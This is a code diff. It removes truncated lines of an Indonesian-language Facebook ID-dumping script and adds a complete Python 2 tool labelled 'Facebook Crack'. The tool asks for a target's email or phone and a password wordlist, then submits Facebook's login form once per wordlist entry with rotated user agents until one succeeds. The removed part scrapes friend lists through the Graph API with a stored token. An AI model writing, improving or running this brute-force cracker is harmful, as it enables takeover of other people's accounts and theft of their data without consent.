@@ -1,38 +1,86 @@
-try:
-        usera = open('tool/useragent.json',>
-        printer(Panel(f'''{A2}{usera}''',ti>
-        input('\n   %s[ %sKembali %s]'%(J,P>
-        tampilan_menu()
-    except Exception as e:kecuali(e)
+#!/usr/bin/env python
+# -*- coding: UTF-8 -*-
 
-###----------[ DUMP ID PUBLIC ]---------- #>
-def publik():
-    global file_dump
-    try:
-        try:
-            token  = open('login/token.json>
-            cookie = {'cookie':open('login/>
-        except:
-            print('\n%s[%s•%s] %sCookies In>
-            time.sleep(3)
-            login()
-        print('       %s[%s•%s] %sContoh : >
-        tid = input('       %s[%s•%s] %sID >
-        file_dump = 'dump/%s.json'%(tid[0])
-        try:os.remove(file_dump)
-        except:pass
-        for id in tid :
-            try:
-                url = ("https://graph.faceb>
-                with requests.Session() as >
-                    jso = json.loads(xyz.ge>
-                    if len(gabung_sandi) !=>
-                        for x in range(Post>
-                            open(file_dump,>
-                    else:
-                        for d in jso["frien>
-                            try:open(file_d>
-                            except:continue
-            except Exception as e:kecuali(e)
-        jum = open(file_dump,'r').read().sp>
-        print('       %s[%s•%s] %sBerhasil >
+import sys
+import mechanize
+import cookielib
+import random
+
+
+
+
+email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
+
+
+passwordlist = str(raw_input("Enter the wordlist name and path : "))
+
+
+login = 'https://www.facebook.com/login.php?login_attempt=1'
+
+
+useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
+
+def main():
+	global br
+	br = mechanize.Browser()
+	cj = cookielib.LWPCookieJar()
+	br.set_handle_robots(False)
+	br.set_handle_redirect(True)
+	br.set_cookiejar(cj)
+	br.set_handle_equiv(True)
+	br.set_handle_referer(True)
+	br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+	welcome()
+	search()
+	print("Password does not exist in the wordlist")
+
+	
+	
+def brute(password):
+	sys.stdout.write("\r[*] Trying ..... {}\n".format(password))
+	sys.stdout.flush()
+	br.addheaders = [('User-agent', random.choice(useragents))]
+	site = br.open(login)
+	br.select_form(nr = 0)
+	br.form['email'] = email
+	br.form['pass'] = password
+	sub = br.submit()
+	log = sub.geturl()
+	if log != login and (not 'login_attempt' in log):
+			print("\n\n[+] Password Find = {}".format(password))
+			raw_input("ANY KEY to Exit....")
+			sys.exit(1)
+
+			
+def search():
+	global password
+	passwords = open(passwordlist,"r")
+	for password in passwords:
+		password = password.replace("\n","")
+		brute(password)
+
+		
+#welcome 
+def welcome():
+	wel = """
+
+        +=========================================+
+        |..........   Facebook Crack   ...........|
+        +-----------------------------------------+
+        |            #Author: Cyber-Dark              | 
+        |	       Version 1.0                |
+ 	|   https://github.com\rizki-Cyber23      |
+        +=========================================+
+        |..........  Facebook Cracker  ...........|
+        +-----------------------------------------+\n\n
+"""
+	total = open(passwordlist,"r")
+	total = total.readlines()
+	print wel 
+	print " [*] Account to crack : {}".format(email)
+	print " [*] Loaded :" , len(total), "passwords"
+	print " [*] Cracking, please wait ...\n\n"
+
+	
+if __name__ == '__main__':
+	main()
